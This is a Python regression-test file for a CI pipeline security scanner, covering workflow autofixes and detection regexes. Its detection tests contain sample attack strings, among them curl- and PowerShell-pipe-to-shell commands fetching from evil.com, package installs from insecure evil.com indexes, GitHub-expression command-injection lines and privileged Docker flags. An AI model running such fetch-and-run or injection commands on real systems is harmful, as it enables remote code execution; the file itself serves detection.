"""Regression tests locking in the fixes for bugs A–E found in review.

Each test is named after the bug it guards; if one of these ever flips
back, it should point directly at the class of regression.
"""
from __future__ import annotations

from unittest.mock import patch

from pipeline_check.core import autofix
from pipeline_check.core.checks.base import Finding, Severity, is_quoted_assignment


def _f(check_id: str) -> Finding:
    return Finding(
        check_id=check_id, title="t", severity=Severity.CRITICAL,
        resource="x", description="", recommendation="", passed=False,
    )


# ────────────────────────────────────────────────────────────────────────
# Bug A — GHA-002 fixer must handle the two-line checkout form.
# ────────────────────────────────────────────────────────────────────────

def test_bug_a_gha002_fixes_named_checkout_step():
    """``- name: Checkout`` with a separate ``uses:`` line is the most
    common form in large workflows. The pre-fix regex only caught
    ``- uses:`` single-line; this verifies both forms work."""
    wf = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - name: Checkout\n"
        "        uses: actions/checkout@v4\n"
    )
    out = autofix.generate_fix(_f("GHA-002"), wf)
    assert out is not None, "fixer should detect the two-line form"
    assert "persist-credentials: false" in out
    # Indent math: with: should sit at col 8 (same as `uses:`), not
    # col 10 (the bug pre-fix would have over-indented it).
    assert "        with:" in out
    assert "          persist-credentials: false" in out


def test_bug_a_gha002_still_handles_single_line_form():
    wf = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
    )
    out = autofix.generate_fix(_f("GHA-002"), wf)
    assert out is not None
    # `uses:` is at col 8; `with:` sibling should also land at col 8.
    assert "        with:" in out
    assert "          persist-credentials: false" in out


def test_bug_a_gha002_idempotent_on_named_form_already_set():
    """The existing-with-block branch must also work under the
    two-line form — otherwise re-running the fixer duplicates the key."""
    wf = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - name: Checkout\n"
        "        uses: actions/checkout@v4\n"
        "        with:\n"
        "          persist-credentials: false\n"
    )
    assert autofix.generate_fix(_f("GHA-002"), wf) is None


# ────────────────────────────────────────────────────────────────────────
# Bug B — Lambda fan-out must honour the ``provider`` kwarg.
# ────────────────────────────────────────────────────────────────────────

def test_bug_b_fanout_forwards_provider_to_scanner(monkeypatch):
    from pipeline_check import lambda_handler as lh

    captured: list[dict] = []

    class _FakeScanner:
        def __init__(self, *, pipeline, region, **kw):
            captured.append({"pipeline": pipeline, "region": region, **kw})
        def run(self):
            return []

    monkeypatch.setattr(lh, "Scanner", _FakeScanner)
    monkeypatch.delenv("PIPELINE_CHECK_RESULTS_BUCKET", raising=False)
    monkeypatch.delenv("PIPELINE_CHECK_SNS_TOPIC_ARN", raising=False)

    # Single legacy call with ``provider`` in the event.
    lh.handler({"region": "eu-west-1", "provider": "terraform", "tf_plan": "plan.json"}, None)
    assert captured[0]["pipeline"] == "terraform"
    assert captured[0]["region"] == "eu-west-1"
    assert captured[0]["tf_plan"] == "plan.json"


def test_bug_b_fanout_iterates_providers(monkeypatch):
    from pipeline_check import lambda_handler as lh

    scanned: list[str] = []

    class _FakeScanner:
        def __init__(self, *, pipeline, region, **kw):
            scanned.append(pipeline)
        def run(self):
            return []

    monkeypatch.setattr(lh, "Scanner", _FakeScanner)
    monkeypatch.delenv("PIPELINE_CHECK_RESULTS_BUCKET", raising=False)
    monkeypatch.delenv("PIPELINE_CHECK_SNS_TOPIC_ARN", raising=False)

    result = lh.handler(
        {"regions": ["us-east-1"], "providers": ["aws", "terraform"],
         "tf_plan": "plan.json"},
        None,
    )
    # Each provider was actually scanned (not silently collapsed to aws).
    assert "aws" in scanned
    assert "terraform" in scanned
    assert len(result["scans"]) == 2


# ────────────────────────────────────────────────────────────────────────
# Bug C — is_quoted_assignment must recognise GitHub ${{ … }} expressions.
# ────────────────────────────────────────────────────────────────────────

def test_bug_c_is_quoted_assignment_github_expression():
    assert is_quoted_assignment('TITLE="${{ github.event.pull_request.title }}"')
    assert is_quoted_assignment('MSG="${{ github.event.head_commit.message }}"')


def test_bug_c_is_quoted_assignment_still_recognises_shell_and_ado():
    """Sanity: the new regex must not regress the shell / ADO cases."""
    assert is_quoted_assignment('BRANCH="$BITBUCKET_BRANCH"')
    assert is_quoted_assignment('BRANCH="${CI_COMMIT_BRANCH}"')
    assert is_quoted_assignment('BRANCH="$(Build.SourceBranchName)"')


def test_bug_c_is_quoted_assignment_rejects_command_injection():
    """A ``run:`` line that actually executes the untrusted value must
    still be flagged — the escape hatch is ONLY for capture-to-variable
    assignments."""
    assert not is_quoted_assignment('echo ${{ github.event.pull_request.title }}')
    assert not is_quoted_assignment('curl https://x.com/${{ github.event.issue.body }}')


def test_is_quoted_assignment_rejects_command_substitution_bypass():
    """VAR="$(curl ${{ attacker_input }})" must NOT be treated as safe
    because the command substitution executes the untrusted content
    even inside double quotes."""
    assert not is_quoted_assignment(
        'VAR="$(curl ${{ github.event.issue.title }})"'
    )
    assert not is_quoted_assignment(
        'RESULT="$(echo $UNTRUSTED_VAR)"'
    )
    # But a plain assignment without command substitution is still safe.
    assert is_quoted_assignment('TITLE="${{ github.event.pull_request.title }}"')


# ────────────────────────────────────────────────────────────────────────
# Bug D — Terraform module-dir filter must use exact equality.
# ────────────────────────────────────────────────────────────────────────

def test_bug_d_terraform_filter_does_not_over_match_on_prefix(monkeypatch):
    from types import SimpleNamespace

    from pipeline_check.core import diff as diff_mod
    from pipeline_check.core.scanner import _filter_context_by_diff

    ctx = SimpleNamespace(plan={"planned_values": {"root_module": {"resources": [
        {"address": "module.vpc.aws_subnet.a"},        # module vpc, NOT changed
        {"address": "module.vpc_prod.aws_subnet.a"},   # module vpc_prod, DOES map to vpc-prod dir
    ]}}})
    # Only ``modules/vpc-prod/main.tf`` changed. Substring match would
    # have kept the vpc module too ("vpc" in "vpc-prod"). Exact match
    # (the fix) keeps only vpc_prod.
    with patch.object(diff_mod, "changed_files", return_value={"modules/vpc-prod/main.tf"}):
        _filter_context_by_diff(ctx, "origin/main", "terraform")
    kept = [r["address"] for r in ctx.plan["planned_values"]["root_module"]["resources"]]
    assert kept == []  # neither module matches "vpc-prod" exactly


def test_bug_d_terraform_filter_matches_module_dir_exactly(monkeypatch):
    from types import SimpleNamespace

    from pipeline_check.core import diff as diff_mod
    from pipeline_check.core.scanner import _filter_context_by_diff

    ctx = SimpleNamespace(plan={"planned_values": {"root_module": {"resources": [
        {"address": "module.vpc.aws_subnet.a"},
        {"address": "module.kms.aws_kms_key.a"},
    ]}}})
    with patch.object(diff_mod, "changed_files", return_value={"modules/vpc/main.tf"}):
        _filter_context_by_diff(ctx, "origin/main", "terraform")
    kept = [r["address"] for r in ctx.plan["planned_values"]["root_module"]["resources"]]
    assert kept == ["module.vpc.aws_subnet.a"]


# ────────────────────────────────────────────────────────────────────────
# Bug E — GHA-008 fixer must preserve the operator's existing comment.
# ────────────────────────────────────────────────────────────────────────

def test_bug_e_gha008_preserves_existing_comment():
    wf = 'env:\n  AWS_KEY: AKIAIOSFODNN7EXAMPLE  # tracked in INFRA-4123\n'
    out = autofix.generate_fix(_f("GHA-008"), wf)
    assert out is not None
    assert "AKIA" not in out
    assert "INFRA-4123" in out, (
        "operator's original comment was clobbered by the TODO insertion"
    )
    assert "TODO(pipelineguard)" in out


def test_bug_e_gha008_still_adds_todo_without_existing_comment():
    wf = 'env:\n  AWS_KEY: AKIAIOSFODNN7EXAMPLE\n'
    out = autofix.generate_fix(_f("GHA-008"), wf)
    assert out is not None
    assert "AKIA" not in out
    assert "TODO(pipelineguard)" in out


# ────────────────────────────────────────────────────────────────────────
# Widened shared regex coverage
# ────────────────────────────────────────────────────────────────────────

def test_curl_pipe_re_new_patterns():
    from pipeline_check.core.checks.base import CURL_PIPE_RE
    # bash -c "$(curl ...)"
    assert CURL_PIPE_RE.search('bash -c "$(curl https://evil.com/install.sh)"')
    # curl | sudo bash
    assert CURL_PIPE_RE.search("curl https://evil.com/install.sh | sudo bash")
    # PowerShell irm | iex
    assert CURL_PIPE_RE.search("irm https://evil.com/install.ps1 | iex")
    assert CURL_PIPE_RE.search("Invoke-WebRequest https://evil.com/install.ps1 | iex")
    # python -c "requests.get("
    assert CURL_PIPE_RE.search('python -c "requests.get(\'https://evil.com/payload\')"')
    # curl > x.sh && bash x
    assert CURL_PIPE_RE.search("curl https://evil.com > install.sh && bash install.sh")
    # Safe: curl without pipe — should NOT match
    assert not CURL_PIPE_RE.search("curl -o output.json https://api.example.com/data")


def test_docker_insecure_re_new_patterns():
    from pipeline_check.core.checks.base import DOCKER_INSECURE_RE
    # Docker socket mount
    assert DOCKER_INSECURE_RE.search(
        "docker run -v /var/run/docker.sock:/var/run/docker.sock myimage"
    )
    # PID host namespace
    assert DOCKER_INSECURE_RE.search("docker run --pid=host myimage")
    assert DOCKER_INSECURE_RE.search("docker run --pid host myimage")
    # User namespace sharing
    assert DOCKER_INSECURE_RE.search("docker run --userns=host myimage")
    # Docker compose --privileged
    assert DOCKER_INSECURE_RE.search("docker compose up --privileged")
    # Safe: normal run
    assert not DOCKER_INSECURE_RE.search("docker run --rm myimage")


def test_pkg_insecure_re_new_patterns():
    from pipeline_check.core.checks.base import PKG_INSECURE_RE
    # pip3
    assert PKG_INSECURE_RE.search("pip3 install --index-url http://evil.com/pypi pkg")
    # pip -i short form
    assert PKG_INSECURE_RE.search("pip install -i http://evil.com/pypi pkg")
    # pip --extra-index-url
    assert PKG_INSECURE_RE.search("pip install --extra-index-url http://evil.com/pypi pkg")
    # gem install
    assert PKG_INSECURE_RE.search("gem install --source http://evil.com/gems mygem")
    # nuget
    assert PKG_INSECURE_RE.search("nuget install MyPkg -Source http://evil.com/nuget")
    # cargo
    assert PKG_INSECURE_RE.search("cargo install --index http://evil.com/crates mycrate")
    # Safe: https registry
    assert not PKG_INSECURE_RE.search("pip install --index-url https://pypi.org/simple/ pkg")


def test_vuln_scan_tokens_new_entries():
    from pipeline_check.core.checks.base import VULN_SCAN_TOKENS
    for token in ("cargo audit", "bundler-audit", "docker scout",
                  "codeql-action", "semgrep ", "bandit ", "checkov ", "tfsec "):
        assert token in VULN_SCAN_TOKENS, f"{token!r} missing from VULN_SCAN_TOKENS"
